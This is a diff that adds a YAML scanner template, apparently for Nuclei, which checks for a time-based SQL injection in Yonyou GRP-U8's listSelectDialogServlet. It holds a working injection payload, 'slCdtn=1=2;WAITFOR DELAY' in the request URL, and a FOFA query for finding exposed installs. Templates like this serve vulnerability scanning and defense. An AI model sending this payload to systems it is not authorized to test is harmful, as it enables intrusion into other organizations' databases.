@@ -1,0 +1,47 @@
+id: poc-yaml-yongyou-grp-u8-listselectdialogservlet-sqli
+info:
+  name: 用友GRP-U8 listSelectDialogServlet SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: GRP-U8
+    fofa: app="用友-GRP-U8"
+
+variables:
+  t1: "{{rand_int(2, 6)}}"
+  t2: "{{to_number(t1) * 2 + 1}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "GRP-U8"
+        part: body
+
+  - raw:
+      - |
+        GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;WAITFOR+DELAY+%270:0:{{t1}}%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "[]"
+        part: body
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration <= to_number(t2)"
